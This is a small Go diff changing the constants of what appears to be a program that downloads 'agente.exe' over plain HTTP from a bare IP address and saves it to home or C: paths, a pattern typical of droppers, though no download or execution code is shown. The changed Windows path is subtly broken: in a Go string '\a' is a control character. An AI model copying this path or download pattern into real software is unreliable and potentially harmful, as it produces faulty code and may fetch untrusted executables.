@@ -11,7 +11,7 @@ import (
 
 const (
 	filePath  = "/home/agente.exe"
-	filePath2 = "C:/agente.exe"
+	filePath2 = "C:\agente.exe"
 	url       = "http://200.98.129.32/agente.exe"
 )
 
